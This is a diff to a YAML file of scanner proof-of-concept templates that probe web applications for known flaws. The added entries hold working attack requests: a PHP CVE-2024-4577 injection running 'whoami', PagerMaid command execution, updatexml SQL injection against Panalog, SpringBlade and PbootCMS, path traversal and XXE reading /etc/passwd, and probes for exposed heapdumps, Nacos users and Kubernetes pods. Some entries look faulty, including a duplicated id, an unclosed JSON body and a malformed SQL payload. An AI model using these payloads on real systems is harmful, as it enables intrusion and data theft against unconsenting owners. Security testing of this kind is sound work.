@@ -130,19 +130,20 @@ pocs:
             part: "body"
             words:
               - "syntax"
-            condition: "or"
+              - "pbootcms"
+            condition: "and"
 
   - id: "php-cve-2024-4577-vuln"
     name: "PHP CVE-2024-4577 Vulnerability"
     requests:
       - method: "POST"
         path: '/?%ADd+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input'
-        body: 'whoami;echo 1337; die;'
+        body: 'whoami;echo 65221335429721217; die;'
         matchers:
           - type: "word"
             part: "body"
             words:
-              - "1337"
+              - "65221335429721217"
             condition: "or"
 
   - id: "ruby-file-read"
@@ -574,6 +575,19 @@ pocs:
               - "actuator/info"
               - "actuator/health"
             condition: "or"
+  - id: "spring-management-leak"
+    name: "Spring Management信息泄露"
+    requests:
+      - method: "GET"
+        path: "/management"
+        matchers:
+          - type: "word"
+            part: "body"
+            words:
+              - "management/env"
+              - "management/info"
+              - "management/health"
+            condition: "or"
   - id: "spring-actuator-leak-2"
     name: "Spring Actuator信息泄露(路径穿越)"
     requests:
@@ -757,6 +771,8 @@ pocs:
     requests:
       - method: "GET"
         path: '/nacos/v1/auth/users?pageNo=1&pageSize=10'
+        headers:
+          example: "example"
         matchers:
           - type: "word"
             part: "body"
@@ -880,6 +896,21 @@ pocs:
             condition: "or"
       - method: "GET"
         path: '/backup.tar'
+        matchers:
+          - type: "word"
+            part: "header"
+            words:
+              - 'application/x-tar'
+              - 'application/zip'
+              - 'application/x-zip'
+              - 'application/gzip'
+              - 'application/x-zip-compressed'
+              - 'application/octet-stream'
+              - 'application/x-rar-compressed'
+              - 'application/x-tar'
+            condition: "or"
+      - method: "GET"
+        path: '/install.tar.gz'
         matchers:
           - type: "word"
             part: "header"
@@ -1072,3 +1103,305 @@ pocs:
               - 'ER_MALFORMED_GTID_SET_SPECIFICATION'
               - '@'
             condition: "and"
+  - id: "panalog-sql-vuln"
+    name: "Panalog SQLi"
+    requests:
+      - method: "GET"
+        path: '/Maintain/sprog_upstatus.php?status=1&id=1%20and%20updatexml(1,concat(0x7e,user()),0)&rdb=1'
+        matchers:
+          - type: "word"
+            part: "body"
+            words:
+              - "SQLSTATE"
+              - "SQL syntax"
+              - "XPATH syntax error"
+              - "Syntax error"
+            condition: "or"
+  - id: "pagermaid-rce-vuln"
+    name: "pagermaid rce vuln"
+    requests:
+      - method: "GET"
+        path: '/pagermaid/api/run_sh?cmd=id'
+        matchers:
+          - type: "word"
+            part: "body"
+            words:
+              - "uid="
+              - "gid="
+            condition: "and"
+  - id: "springBlade-sql-vuln"
+    name: "springBlade sql vuln"
+    requests:
+      - method: "GET"
+        path: '/api/blade-system/menu/list?updatexml(1,concat(0x7e,md5(1),0x7e),1)=1'
+        matchers:
+          - type: "word"
+            part: "body"
+            words:
+              - "SQLSTATE"
+              - "SQL syntax"
+              - "XPATH syntax error"
+              - "Syntax error"
+            condition: "or"
+  - id: "pbootcms-sql-vuln"
+    name: "pbootcms sql vuln"
+    requests:
+      - method: "GET"
+        path: '/index.php/Search/index?keyword=123&updatexml(1,concat(0x7e,user(),0x7e),1));%23=123'
+        matchers:
+          - type: "word"
+            part: "body"
+            words:
+              - "SQLSTATE"
+              - "SQL syntax"
+              - "XPATH syntax error"
+              - "Syntax error"
+            condition: "or"
+  - id: "pbootcms-sql-vuln"
+    name: "pbootcms sql vuln"
+    requests:
+      - method: "GET"
+        path: '/index.php/Index?ext_price%3D1/**/and/**/updatexml(1,concat(0x7e,(SELECT/**/distinct/**/concat(0x23,user(),0x23)/**/FROM/**/ay_user/**/limit/**/0,1)0x7e),1));%23=123)'
+        matchers:
+          - type: "word"
+            part: "body"
+            words:
+              - "SQLSTATE"
+              - "SQL syntax"
+              - "XPATH syntax error"
+              - "Syntax error"
+            condition: "or"
+  - id: "file-read-vuln"
+    name: "file read vuln"
+    requests:
+      - method: "GET"
+        path: '/download?path=../../../../../../C:/Windows/win.ini'
+        matchers:
+          - type: "word"
+            part: "body"
+            words:
+              - "; for 16-bit app support"
+            condition: "or"
+      - method: "GET"
+        path: '/download?path=../../../../../../etc/passwd'
+        matchers:
+          - type: "word"
+            part: "body"
+            words:
+              - "root:x:"
+            condition: "or"
+      - method: "GET"
+        path: '/download.php?file=../../../../../../etc/passwd'
+        matchers:
+          - type: "word"
+            part: "body"
+            words:
+              - "root:x:"
+            condition: "or"
+      - method: "GET"
+        path: '/index.php?action=download&file=../../../../../../etc/passwd'
+        matchers:
+          - type: "word"
+            part: "body"
+            words:
+              - "root:x:"
+            condition: "or"
+      - method: "GET"
+        path: '/api/v1/files?fileId=../../../../../../etc/passwd'
+        matchers:
+          - type: "word"
+            part: "body"
+            words:
+              - "root:x:"
+            condition: "or"
+      - method: "GET"
+        path: '/getResource?resource=../../../../../../etc/passwd'
+        matchers:
+          - type: "word"
+            part: "body"
+            words:
+              - "root:x:"
+            condition: "or"
+      - method: "GET"
+        path: '/Handler.ashx?file=../../../../../../etc/passwd'
+        matchers:
+          - type: "word"
+            part: "body"
+            words:
+              - "root:x:"
+            condition: "or"
+      - method: "GET"
+        path: '/static/download?doc=../../../../../../etc/passwd'
+        matchers:
+          - type: "word"
+            part: "body"
+            words:
+              - "root:x:"
+            condition: "or"
+      - method: "GET"
+        path: '/api/download?resource=../../../../../../etc/passwd'
+        matchers:
+          - type: "word"
+            part: "body"
+            words:
+              - "root:x:"
+            condition: "or"
+      - method: "GET"
+        path: '/download.lua?file=../../../../../../etc/passwd'
+        matchers:
+          - type: "word"
+            part: "body"
+            words:
+              - "root:x:"
+            condition: "or"
+      - method: "GET"
+        path: '/DownloadFile?file=../../../../../../etc/passwd'
+        matchers:
+          - type: "word"
+            part: "body"
+            words:
+              - "root:x:"
+            condition: "or"
+  - id: "cremb-xxe-vuln"
+    name: "Cremb xxe vuln"
+    requests:
+      - method: "POST"
+        path: '/api/admin/payment/callback/wechat'
+        headers:
+          Content-Type: 'application/xml'
+        body: '<?xml version="1.0"?> 
+<!DOCTYPE foo [ <!ELEMENT foo ANY > <!ENTITY xxe SYSTEM "file:/etc/passwd">]> <foo> <return_code>&xxe;</return_code> </foo>'
+        matchers:
+          - type: "word"
+            part: "body"
+            words:
+              - "root:x:"
+            condition: "or"
+  - id: "fastjson-rce-vuln"
+    name: "fastjson rce vuln"
+    requests:
+      - method: "POST"
+        path: '/'
+        headers:
+          Content-Type: 'application/json'
+        body: '{
+  "@type": "java.lang.AutoCloseable"'
+        matchers:
+          - type: "word"
+            part: "body"
+            words:
+              - "fastjson-version"
+            condition: "or"
+  - id: "api-info"
+    name: "api info"
+    requests:
+      - method: "GET"
+        path: '/api/v2/api-docs'
+        matchers:
+          - type: "word"
+            part: "body"
+            words:
+              - "swagger"
+            condition: "or"
+  - id: "ruoyi-api-info"
+    name: "ruoyi api info"
+    requests:
+      - method: "GET"
+        path: '/admin-api/sysRole/listByRoleId'
+        matchers:
+          - type: "word"
+            part: "body"
+            words:
+              - "requestUrl"
+              - "permissionTag"
+            condition: "and"
+      - method: "GET"
+        path: '/prod-api/sysRole/listByRoleId'
+        matchers:
+          - type: "word"
+            part: "body"
+            words:
+              - "requestUrl"
+              - "permissionTag"
+            condition: "and"
+      - method: "GET"
+        path: '/api/sysRole/listByRoleId'
+        matchers:
+          - type: "word"
+            part: "body"
+            words:
+              - "requestUrl"
+              - "permissionTag"
+            condition: "and"
+      - method: "GET"
+        path: '/dev-api/sysRole/listByRoleId'
+        matchers:
+          - type: "word"
+            part: "body"
+            words:
+              - "requestUrl"
+              - "permissionTag"
+            condition: "and"
+  - id: "k8s-info"
+    name: "k8s info"
+    requests:
+      - method: "GET"
+        path: '/pods'
+        matchers:
+          - type: "word"
+            part: "body"
+            words:
+              - "kubernetes.io"
+            condition: "or"
+  - id: "corecms-info"
+    name: "corecms info"
+    requests:
+      - method: "GET"
+        path: '/index.php?con=admin&ctl=system/user'
+        matchers:
+          - type: "word"
+            part: "body"
+            words:
+              - "Latest Login time"
+              - "Administrator"
+              - "User name"
+            condition: "and"
+  - id: "heapdump-info"
+    name: "heapdump info"
+    requests:
+      - method: "GET"
+        path: '/swapadmin/admin/heapdump'
+        matchers:
+          - type: "word"
+            part: "header"
+            words:
+              - 'application/octet-stream'
+              - 'filename="heapdump'
+            condition: "or"
+      - method: "GET"
+        path: '/prod-api/heapdump'
+        matchers:
+          - type: "word"
+            part: "header"
+            words:
+              - 'application/octet-stream'
+              - 'filename="heapdump'
+            condition: "or"
+      - method: "GET"
+        path: '/api/heapdump'
+        matchers:
+          - type: "word"
+            part: "header"
+            words:
+              - 'application/octet-stream'
+              - 'filename="heapdump'
+            condition: "or"
+      - method: "GET"
+        path: '/dev-api/heapdump'
+        matchers:
+          - type: "word"
+            part: "header"
+            words:
+              - 'application/octet-stream'
+              - 'filename="heapdump'
+            condition: "or"
